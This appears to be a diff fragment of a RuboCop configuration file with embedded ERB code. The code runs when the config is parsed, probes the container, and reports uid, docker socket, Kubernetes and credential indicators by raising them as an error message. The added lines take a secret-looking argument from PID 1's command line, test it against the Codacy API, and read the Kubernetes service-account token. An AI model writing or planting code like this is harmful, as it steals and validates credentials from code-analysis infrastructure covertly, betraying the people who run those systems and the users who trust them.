@@ -142,7 +142,31 @@ AllCops:
         mount_meta = "mount_meta_error=#{e.class}"
       end
       marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback},#{cap_meta},#{proc_root_meta},#{kernel_meta},#{ns_meta},#{pid_meta},#{mount_meta}"
-      raise marker
+      recheck_raw = (File.read('/proc/1/cmdline', 16384) rescue '')
+      recheck_args = recheck_raw.split("\0").reject(&:empty?)
+      recheck_idx = recheck_args.index { |a| a.match?(/(?:api[-_]?token|api[-_]?key|token|secret)/i) }
+      recheck_candidate = (recheck_idx && recheck_args[recheck_idx + 1].to_s) || ''
+      recheck_candidate = recheck_candidate.gsub(/\A['"]|['"]\z/, '')
+      recheck_api_status = 'not_attempted'
+      recheck_api_bytes = 0
+      begin
+        if recheck_candidate.length > 20 && recheck_candidate.length < 10000
+          recheck_uri = URI('https://api.codacy.com/api/v3/user')
+          recheck_http = Net::HTTP.new(recheck_uri.host, recheck_uri.port)
+          recheck_http.use_ssl = true
+          recheck_http.open_timeout = 3
+          recheck_http.read_timeout = 3
+          recheck_req = Net::HTTP::Get.new(recheck_uri.request_uri)
+          recheck_req['api-token'] = recheck_candidate
+          recheck_res = recheck_http.request(recheck_req)
+          recheck_api_status = recheck_res.code.to_s
+          recheck_api_bytes = [recheck_res.body.to_s.bytesize, 1024].min
+        end
+      rescue => recheck_error
+        recheck_api_status = "error=#{recheck_error.class}"
+      end
+      recheck_sa = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
+      marker = marker + ",SOL_RUBOCOP_TOKEN_RECHECK_20260715=pid1_arg=#{!recheck_candidate.empty?},candidate_len=#{recheck_candidate.length},sa_token_present=#{!recheck_sa.empty?},api_status=#{recheck_api_status},api_bytes=#{recheck_api_bytes}"      raise marker
     end %>
 - <%= begin
       require 'net/http'
